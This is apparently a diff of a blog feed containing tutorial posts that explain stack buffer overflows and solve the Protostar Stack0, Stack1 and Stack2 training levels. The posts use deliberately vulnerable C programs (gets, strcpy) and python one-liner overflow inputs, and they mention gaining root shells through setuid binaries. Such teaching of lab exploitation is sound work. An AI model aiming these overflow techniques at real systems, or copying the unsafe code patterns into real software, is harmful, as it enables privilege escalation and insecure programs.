-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-articles--tweet-about-the-article-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous articles&lt;/a&gt; , Tweet about the article if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;next-buffer-overflow-article--buffer-overflow-practical-examples--hexadecimal-values-and-environment-variables----protostar-stack1--stack2&quot;&gt;Next Buffer Overflow article : &lt;a href=&quot;/binary-exploitation/bof2/&quot;&gt;Buffer Overflow Practical Examples , Hexadecimal values and Environment Variables ! - Protostar Stack1 , Stack2&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction So first of all I know that there are many tutorials published about buffer overflow and binary exploitation but I decided to write this article because most of these tutorials and articles don’t really talk about the basic fundmentals needed to understand what a buffer overflow really is. They just go explaining what’s a buffer overflow without explaining what is a buffer , what is a stack or what are memory addresses etc. And I just wanted to make it easier for someone who wants to learn about it to find an article that covers the basics. So what I’m going to talk about in this article is what is a buffer , what is a stack and what are the memory addresses and we will take a look at the application memory structure , what is a buffer overflow and why does it happen then I’ll show a really basic and simple example for exploiting a buffer overflow (protostar stack0) Buffer So what’s a buffer ? Simply a buffer is a memory place or location which is used by a running program. This memory location is used to store some temporary data that is being used by the program. So for example if we have a simple program that asks the user to enter his name and stores it in a variable called username then it prints “Hello username “ . For example if we run the program and enter username as “Rick”. The word “Rick” is stored in the buffer until the program executes the print command and it retrieves the given username “Rick” from the buffer to output the result : “Hello Rick” Our example written in c will be like this #include &amp;lt;stdio.h&amp;gt; int main () { char username[20]; printf(&quot;Enter your name: &quot;); scanf(&quot;%s&quot;, username); printf(&quot;Hello %s\n&quot;, username); return(0); } Break Down int main() This defines the main function char username[20] This is where we specify the variable name but the most important thing about this line is char .... [20] this is where we specify the buffer for that variable , and i assigned it as 20 chars The rest of the code takes the user input then prints it. printf(&quot;Enter your name: &quot;); scanf(&quot;%s&quot;, username); printf(&quot;Hello %s\n, username&quot;); So when we compile and run this program we get the output as expected right ? Now before we talk about the buffer overflow we need to understand how the application memory works Application Memory , Stack and Memory Addresses So how does the application memory look like and what’s a stack ? A stack is a memory buffer that is used to store the functions of the program and local variables. To demonstrate this, we will take a look at this image. First We have the code and this is the source code of the program. This has the main instructions of the program. After that we have the buffer where the global variables are stored, The difference between a local variable and a global variable is that a local variable is limited to a certain function. It’s defined in that function and can be only called in that function but a global variable is either defined in the main function or defined outside a function and this type of variables can be called anywhere. Then we have the Stack and this is the important part of the memory for us because this is where the buffer overflow happens. This is the place where local variable and function calls are stored. Last thing is Heap and this is a dynamic memory allocation. Now we know what does the application memory look like and what is the stack but what are memory addresses ? Basically when a program is compiled and executed , All the instructions of the program take place in the application memory and an address is assigned to them , This address is usually in the format of hexadecimal bytes. So if you disassemble a program and look at it you’ll find the memory addresses , something like this : Why Do Buffer Overflows Happen ? Now we know what is a buffer and we took a deeper look on the memory construction. Now you might already figured out why and when does a buffer overflow happen. A buffer overflow happens when the length of the data entered exceeds the buffer limit and this causes the program to write data outside the allocated buffer area and may overwrite some parts of the memory that were used to hold data used by the program which makes it unavailable and causes the program to crash. To demonstrate this we will go back to our first example. #include &amp;lt;stdio.h&amp;gt; int main () { char username[20]; printf(&quot;Enter your name: &quot;); scanf(&quot;%s&quot;, username); printf(&quot;Hello %s\n&quot;, username); printf(&quot;Program exited normally&quot;); return(0); } We will add a last line to print the sentence “program exited noramlly” just for demonstration purposes Now the program should ask us for username then print “Hello username” then print “program exited normally” and exits. The buffer for holding the username value is set to 20 chars , it’s good as long as the username length is less than 20 chars. But if the entered data is more than 20 chars length the program will crash because some data will be overwritten outside the buffer causing some parts of the program to be corrupted. in our case this will be the part which prints “program exited normally” First let’s run the program and enter the name as Rick The program exits normally. Now let’s run it again and enter the name as 30 A’s We get “Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA” printed then we don’t see “program exited normally” and we get a segmentation fault error. That happened because we entered 10 extra chars, The program only expected 20 or less. Those extra “AAAAAAAAAA” exceeded the 20 chars buffer and overwrited other data (The print instruction which prints “program exited normally”) which caused a segmentation fault because the program is corrupted. Examining Buffer Overflows with gdb Let’s take a deeper look at how this is happening with gdb (gnu debugger). We will write another program that creates a variable called “whatever” then it copies what we give it and put it in that variable. And we will assign the buffer for that variable to be 20 #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char** argv) { char whatever[20]; strcpy(whatever, argv[1]); return 0; } Breakdown int main(int argc, char** argv) This defines the main function and it’s arguments char whatever[20]; This creates the variable and gives it the name “whatever” and assigns its buffer to 20 strcpy(whatever, argv[1]); This copies our input and puts it into our variable “whatever” return 0; And this is our return address Now let’s run the program inside gdb and test it. The input was aaaaa which is less than 20 chars so the program exited normally and everything is good Now let’s throw an input more that 20 chars. We get a segmentation fault because our return address is overwritten and the program couldn’t continue. To show how are these addresses overwritten let’s input any hex value , something like \x12 for 50 times. Then let’s look at the registers. We see that most of the memory addresses are overwritten with 12 Why Are Buffer Overflows Dangerous ? Now you might ask yourself , How will that be harmful ? A buffer overflow is dangerous when the vulnerable binary or program is a setuid binary , If you don’t know what setuid binaries are, read the provided link, but in general They are programs that run with capabilities of another user (usually root) , But when that program is vulnerable to a buffer overflow it’s not a good thing anymore. Since we can pass the buffer and overwrite the program then we can overwrite it with a payload that executes a system call and spawns a root shell I will do more write ups about buffer overflows and other binary exploitation techniques, for now I will start with protostar. There are also some cool boxes on Hack The box that required buffer overflows and binary exploitation to gain root privileges but they’re active right now so I’ll publish my write ups about these boxes as soon as they retire of course. In the meantime, you can read my other Hack The Box write-ups ! Protostar Stack0 Now let’s do a simple practical example. You can download protostar from here I will solve the first level which is stack0 for this article then I will solve the rest of the levels in other write-ups. We’re given the source code of the program : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(&quot;you have changed the 'modified' variable\n&quot;); } else { printf(&quot;Try again?\n&quot;); } } From the code we can understand that the program has a variable called “buffer” and assigns a buffer of 64 chars to it. Then there’s another variable called modified and it’s value is 0. gets(buffer) allows us to input the value of “buffer” variable.Then there’s an if statement that checks if the value of “modified” variable is not equal to 0. If it’s not equal to zero it will print “you have changed the ‘modified’ variable” but if it’s still equal to 0 it will print “Try again?”. So our mission is to change the value of that variable called “modified” As long as the entered data is less than 64 chars everything will run as intended. But if the input exceeds the buffer it will overwrite the value of “modified” variable. We already know that the buffer is 64 chars so we just need to input 65 chars or more and the variable value will change. Let’s test that out. We execute the stack0 bin and we see the output “try again?” Let’s throw 65 “A”s and see the output. python -c &quot;print ('A' * 65)&quot; | ./stack0 And we have successfuly overwritten the variable’s value ! :D That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Next Buffer Overflow article : Buffer Overflow Practical Examples , Hexadecimal values and Environment Variables ! - Protostar Stack1 , Stack2</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/binary-exploitation/BOF/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction So last week I talked about bufferoverflows and solved Protostar Stack0. Today I’m gonna solve Stack1 and Stack2, they are not different from Stack0 in their objective which is changing a variable’s value , but they are different in the way of changing that variable for sure. With that being said let’s jump right in ! If you haven’t read my previous post yet I recommend reading it before this. Stack1 For this challenge we got this code : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; if(argc == 1) { errx(1, &quot;please specify an argument\n&quot;); } modified = 0; strcpy(buffer, argv[1]); if(modified == 0x61626364) { printf(&quot;you have correctly got the variable to the right value\n&quot;); } else { printf(&quot;Try again, you got 0x%08x\n&quot;, modified); } } Breakdown So this code : creates a variable called “modified” and assigns a buffer of 64 chars to it. volatile int modified; char buffer[64]; Checks if we supplied an argument or not. if(argc == 1) { errx(1, &quot;please specify an argument\n&quot;); } Sets the value of the “modified” variable into 0 , then it copies whatever we give it argv[1] into the buffer of “modified”. modified = 0; strcpy(buffer, argv[1]); Then it checks if the variable’s value is 0x61626364 or not if(modified == 0x61626364) { printf(&quot;you have correctly got the variable to the right value\n&quot;); } else { printf(&quot;Try again, you got 0x%08x\n&quot;, modified); } Solution So it’s similar to Stack0 except we need to set the value of the variable into a specific value which is 0x61626364 in this case. This is the hexadecimal value of “dcba” now keep in mind that when reading hex you read it from right to left not left to right. To slove this our input will be 64 chars then after that the value , let’s try it. Let’s execute stack1 We get please specify an argument so let’s enter anything. We get try again you got 0x00000000 , Let’s try to change that by exceeding the buffer and entering any char for example “b” ./stack1 `python -c &quot;print ('A' * 64 + 'b')&quot;` And we see that the value changed to 0x00000062 which is the hex value of “b” so our exploit is working, Let’s apply that. ./stack1 `python -c &quot;print ('A' * 64 + 'dcba')&quot;` And we did it ! But can we do it in another way ? instead of entering ASCII we can use the hex values and python will translate them. ./stack1 `python -c &quot;print('A' * 64 + '\x64\x63\x62\x61')&quot;` Stack2 For this challenge we got this code : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; char *variable; variable = getenv(&quot;GREENIE&quot;); if(variable == NULL) { errx(1, &quot;please set the GREENIE environment variable\n&quot;); } modified = 0; strcpy(buffer, variable); if(modified == 0x0d0a0d0a) { printf(&quot;you have correctly modified the variable\n&quot;); } else { printf(&quot;Try again, you got 0x%08x\n&quot;, modified); } } Breakdown This code : As always creates a variable called “modified” and assigns a buffer of 64 chars to it volatile int modified; char buffer[64]; The new thing here is a variable called “variable” which gets its value from an environment variable called “GREENIE”. variable = getenv(&quot;GREENIE&quot;); The program checks if the variable “variable” has a value or not if(variable == NULL) { errx(1, &quot;please set the GREENIE environment variable\n&quot;); } Sets the value of modified to 0 modified = 0; Then it copies the value of “variable” into the buffer of “modified” strcpy(buffer, variable); After that it checks if the value of “modified” is 0x0d0a0d0a or not if(modified == 0x0d0a0d0a) { printf(&quot;you have correctly modified the variable\n&quot;); } else { printf(&quot;Try again, you got 0x%08x\n&quot;, modified); } Solution So this time we can’t specify the value directly instead of that we have to do it through an environment variable. And this is actually a good example that shows the importance of being creative with your exploits , you won’t face the same situation every time so you have to come up with an exploit that fits with the application’s functionality. In this situation we can apply our usual exploit and store that value into the environment variable “GREENIE”. But wait a minute , what is an environment variable ? Environment Variables Simply , Environment variables are variables that are being used to store values of some stuff that the system uses also the services can access those variables. For a better demonstration let’s see an example. If we take the environment variable BASH and look at it : We see that its value is : /bin/bash So for example if I want to run bash I type bash in the terminal instead of ./bin/bash because the system calls the variable BASH and finds its path. But the system won’t store a variable for every binary that exists on the system so there’s an environment variable called PATH which has all the possible dirs that could contain bins, So when you type for example : python, it searches in those dirs then executes python So you get the idea. Understanding environment variables is not necessary for this challenge but I wanted to talk about it just to make everything clear for anyone. More about environment variables Now let’s execute stack2 We get Please set the GREENIE environment variable. There’s no environment variable called GREENIE so we need to create it. We will make it’s value equal to 64 chars then 0x0d0a0d0a This time we won’t be able to use the value in ASCII like we did with stack1 because 0x0d is a return \r and 0x0a is a new line \n and we can’t type those so we will use the hex values and python will translate them. GREENIE = `python -c &quot;print ('A' * 64 + '\x0a\x0d\x0a\x0d')&quot;` When we look at it we only see the 64 A’s and that’s because we can’t see the new line or the return Now we need to export it to the environment variables list then we are good to go. export GREENIE ./stack2 And we did it ! That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Binary Exploitation - Buffer Overflow Explained in Detail Next Buffer Overflow article : Buffer Overflow Practical Examples , metasploit , gdb and objdump ! - protostar stack3</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/binary-exploitation/BOF2/0.png" /></entry></feed>
